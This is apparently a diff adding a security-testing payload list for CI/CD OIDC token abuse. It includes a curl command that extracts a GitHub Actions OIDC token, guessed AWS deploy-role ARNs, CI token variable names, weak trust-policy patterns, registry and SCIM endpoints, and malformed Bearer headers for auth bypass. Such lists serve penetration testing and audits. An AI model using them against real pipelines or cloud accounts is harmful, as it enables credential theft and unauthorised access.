@@ -1,0 +1,54 @@
+# CI/CD OIDC Token Abuse Payloads
+# Usage: Test trust policy weaknesses and token theft vectors
+
+## GitHub Actions OIDC Token Extraction
+# In workflow step:
+curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value'
+
+## Common AWS Role ARNs for OIDC
+arn:aws:iam::{ACCOUNT}:role/github-actions-role
+arn:aws:iam::{ACCOUNT}:role/deploy-role
+arn:aws:iam::{ACCOUNT}:role/ci-cd-role
+arn:aws:iam::{ACCOUNT}:role/terraform-role
+arn:aws:iam::{ACCOUNT}:role/cdk-deploy-role
+
+## GitLab CI Token Variables
+$CI_JOB_JWT
+$CI_JOB_JWT_V2
+$CI_JOB_TOKEN
+$KUBECONFIG
+
+## CircleCI OIDC
+$CIRCLE_OIDC_TOKEN
+$CIRCLE_OIDC_TOKEN_V2
+
+## Weak Trust Policy Patterns (check for these)
+# Missing sub restriction:
+"Condition": {"StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"}}
+# Wildcard sub:
+"StringLike": {"token.actions.githubusercontent.com:sub": "repo:org/*"}
+# No branch restriction:
+"StringEquals": {"token.actions.githubusercontent.com:sub": "repo:org/repo:*"}
+# No workflow restriction (any workflow can assume)
+
+## Container Registry Endpoints
+/v2/
+/v2/_catalog
+/v2/{repo}/tags/list
+/v2/{repo}/manifests/latest
+/v2/{repo}/blobs/{digest}
+
+## Serverless Auth Bypass
+Authorization: Bearer
+Authorization: Bearer (empty)
+Authorization: Bearer AAAAAA...A (100k chars - timeout trigger)
+
+## SCIM Endpoints
+/scim/v2/Users
+/scim/v2/Groups
+/scim/v2/ServiceProviderConfig
+/scim/v2/ResourceTypes
+/scim/v2/Schemas
+/scim/Users
+/scim/Groups
+/api/scim/v2/Users
